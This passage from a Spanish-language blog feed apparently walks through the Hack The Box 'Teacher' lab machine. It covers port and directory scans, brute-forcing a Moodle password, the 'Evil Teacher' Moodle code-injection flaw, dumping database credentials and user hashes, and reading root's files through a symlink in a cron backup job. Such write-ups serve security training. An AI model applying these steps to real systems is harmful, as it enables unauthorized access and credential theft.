            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos TCP&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap 7.70 scan initiated Thu Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 22:50:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sT -A -sV -o nmap.scan 10.10.10.153
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.153
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.31s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;999&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Blackhat highschool
Device type: WAP
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.20
OS details: Tomato 1.28 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Linux 2.4.20&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Network Distance: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hops

TRACEROUTE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;using proto 1/icmp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   296.09 ms 10.10.12.1
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   300.57 ms 10.10.10.153

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Apr 18 22:52:41 2019 -- 1 IP address (1 host up) scanned in 120.38 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -u http://10.10.10.153 -w /usr/share/wordlists/dirb/common.txt -q -np -x php,html,txt,js -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/gallery.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manual &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/moodle &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/phpmyadmin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Pagina Principal&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2015.55.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;moodle&#34;&gt;/Moodle&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.07.05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;login&#34;&gt;Login&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.12.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpmyadmin&#34;&gt;/phpmyadmin&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.07.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;galleryhtml&#34;&gt;/gallery.html&lt;/h3&gt;
&lt;p&gt;En gallery.html encontramos codigo javascript que imprime un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.02.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.03.31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Junto al codigo hay una imagen, pero no podemos verla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.04.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen con curl y nos muestra un mensaje que contiene la imagen.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.09.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que debemos de encontrar el caracter faltante para la contraseña &lt;code&gt;Th4C00lTheacha&lt;/code&gt; del usuario &lt;code&gt;Giovanni&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;burpsuite---giovanni-password&#34;&gt;BURPSUITE - Giovanni Password&lt;/h2&gt;
&lt;p&gt;Vamos a utilizar burpsuite para encontrar el caracter faltante de la contraseña, utilizando el login de moodle. Para los caracteres utilizamos &lt;code&gt;/usr/share/wordlists/dirb/stress/alphanum_case_extra.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Encontramos que el caracter faltante para la contraseña es &lt;code&gt;#&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.22.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;moodle-1&#34;&gt;Moodle&lt;/h1&gt;
&lt;p&gt;Utilizando las credenciales &lt;code&gt;Giovanni&lt;/code&gt; y &lt;code&gt;Th4C00lTheacha#&lt;/code&gt; logramos ingresar a Moodle.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.23.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;evil-teacher---reverse-shell&#34;&gt;Evil Teacher - Reverse Shell&lt;/h2&gt;
&lt;p&gt;Para nuestra version de moodle encontramos una vulnerabilidad que puede injectar codigo, para ello vamos a crear un Quiz en el curso de Algebra y vamos a agregar una formula de matematica la cual nos va a ayudar a inyectar codigo.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.ripstech.com/2018/moodle-remote-code-execution/&#34;&gt;Evil Teacher: Remote Code Execution&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Peek%202019-04-18%2016-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;user---giovanni&#34;&gt;USER - Giovanni&lt;/h1&gt;
&lt;p&gt;Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.52.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dbtype&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mariadb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dblibrary&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;native&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dbhost&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dbname&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;moodle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dbuser&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dbpass&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Welkom1!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mdl_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$CFG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;dboptions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbpersist&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbport&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3306&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbsocket&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dbcollation&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8mb4_unicode_ci&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nos conectamos a la base de datos&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mariadb -u root -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;Welkom1!&amp;#39;&lt;/span&gt; -D moodle
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos una tabla con usuarios y contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mdl_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mdl_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.56.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Crackeamos la contraseña de Giovanibak en &lt;a href=&#34;https://crackstation.net/&#34;&gt;https://crackstation.net/&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;7a860966115182402ed06375cf0a22af&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; expelled
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.59.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la contraseña con el usuario &lt;code&gt;Giovanni&lt;/code&gt; y obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.00.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;root---flag&#34;&gt;ROOT - flag&lt;/h1&gt;
&lt;p&gt;Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de &lt;code&gt;Giovanni&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.08.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/backup.sh
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home/giovanni/work&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
tar -czvf tmp/backup_courses.tar.gz courses/*&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
tar -xf backup_courses.tar.gz&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
chmod &lt;span class=&#34;m&#34;&gt;777&lt;/span&gt; * -R&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener nuestra bandera &lt;code&gt;root.txt&lt;/code&gt; vamos a untilizar un &lt;code&gt;symlink&lt;/code&gt; y lo vamos a apuntar hacia el directorio &lt;code&gt;/root/&lt;/code&gt; donde esta nuestra bandera para que el archivo cuando se ejecute comprima lo que esta en &lt;code&gt;/root/&lt;/code&gt; al archivo &lt;code&gt;backup_courses.tar.gz&lt;/code&gt; y poder descomprimirlo, para ello vamos a renombrar courses.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.11.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego de un minuto se crea el archivo &lt;code&gt;backup_courses.tar.gz&lt;/code&gt; lo descomprimimos y obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.13.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/teacher/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/teacher/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>moodle</category>
            
          
            
              <category>Evil Teacher</category>
            
          
            
              <category>cron</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>